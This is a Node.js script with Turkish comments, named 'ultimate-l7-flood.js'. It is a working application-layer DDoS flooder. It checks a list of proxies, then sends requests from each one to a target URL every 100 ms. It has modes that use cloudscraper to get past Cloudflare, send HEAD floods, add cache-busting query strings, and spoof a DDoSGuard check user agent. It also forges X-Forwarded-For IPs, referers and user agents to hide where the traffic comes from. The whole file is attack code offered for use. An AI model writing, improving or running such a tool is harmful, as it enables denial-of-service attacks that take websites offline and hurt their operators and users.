// ultimate-l7-flood.js - GROK'u kıskandıracak nihai versiyon 🚀

const fs = require('fs');
const colors = require('colors');
const axios = require('axios');
const cloudscraper = require('cloudscraper');
const HttpsProxyAgent = require('https-proxy-agent');
const ping = require('ping');

const args = process.argv.slice(2);
const target = args[0] || 'https://example.com';
const duration = parseInt(args[1]) || 60;
const mode = args[2] || 'cf';

let attackCount = 0;
let successCount = 0;
let failCount = 0;

function log(message, color = 'white') {
    console.log(colors[color] ? colors[color](message) : message);
}

function getRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function readProxies(filePath) {
    try {
        return fs.readFileSync(filePath, 'utf-8').split('\n').map(p => p.trim()).filter(Boolean);
    } catch (err) {
        log('❌ Proxy dosyası okunamadı: ' + err.message, 'red');
        return [];
    }
}

async function checkProxies(proxies) {
    log('🔍 Proxy'ler kontrol ediliyor...', 'yellow');
    const working = [];
    for (const proxy of proxies) {
        try {
            const agent = new HttpsProxyAgent('http://' + proxy);
            await axios.get('https://api.ipify.org', { httpsAgent: agent, timeout: 3000 });
            working.push(proxy);
        } catch {}
    }
    return working;
}

function startPanel(total, mode) {
    const startTime = Date.now();
    const interval = setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const left = duration - elapsed;
        log(`[⏱️ ${elapsed}s/${duration}s] Mod: ${mode.toUpperCase()} | Aktif: ${attackCount} | Başarılı: ${successCount} | Başarısız: ${failCount} | Proxy: ${total}`, 'cyan');
        if (elapsed >= duration) clearInterval(interval);
    }, 5000);
}

function fakeHeaders() {
    return {
        'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/${Math.floor(Math.random() * 500)}.36 (KHTML, like Gecko) Chrome/110.0.${Math.floor(Math.random() * 500)}.100 Safari/537.36`,
        'Referer': `https://www.google.com/search?q=${Math.random().toString(36).substring(2)}`,
        'X-Forwarded-For': getRandomIP(),
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    };
}

const methods = {
    cf: async (url, proxy) => {
        try {
            await cloudscraper.get({ uri: url, proxy: 'http://' + proxy, headers: fakeHeaders() });
            attackCount++;
            successCount++;
        } catch { failCount++; }
    },
    head: async (url, proxy) => {
        try {
            const agent = new HttpsProxyAgent('http://' + proxy);
            await axios.head(url, { headers: fakeHeaders(), httpsAgent: agent, timeout: 5000 });
            attackCount++;
            successCount++;
        } catch { failCount++; }
    },
    poison: async (url, proxy) => {
        const rand = Math.random().toString(36).substring(2);
        const fullUrl = `${url}?cb=${rand}`;
        try {
            const agent = new HttpsProxyAgent('http://' + proxy);
            await axios.get(fullUrl, { headers: fakeHeaders(), httpsAgent: agent, timeout: 5000 });
            attackCount++;
            successCount++;
        } catch { failCount++; }
    },
    ddg: async (url, proxy) => {
        try {
            const agent = new HttpsProxyAgent('http://' + proxy);
            await axios.get(url, {
                headers: {
                    ...fakeHeaders(),
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 DDoSGuardCheck/2.0',
                    'Referer': 'https://google.com/'
                },
                httpsAgent: agent,
                timeout: 5000
            });
            attackCount++;
            successCount++;
        } catch { failCount++; }
    }
};

function startAttackLoop(proxies, methodName) {
    const end = Date.now() + duration * 1000;
    const method = methods[methodName];
    if (!method) return log('❌ Geçersiz mod belirtildi!', 'red');

    for (const proxy of proxies) {
        const interval = setInterval(() => {
            if (Date.now() > end) return clearInterval(interval);
            method(target, proxy);
        }, 100);
    }
}

(async () => {
    log(`🎯 Hedef: ${target} | Süre: ${duration}s | Mod: ${mode}`, 'green');
    const proxies = readProxies('proxies.txt');
    const workingProxies = await checkProxies(proxies);
    log(`✅ Çalışan proxy sayısı: ${workingProxies.length}`, 'green');
    startPanel(workingProxies.length, mode);
    startAttackLoop(workingProxies, mode);
})();
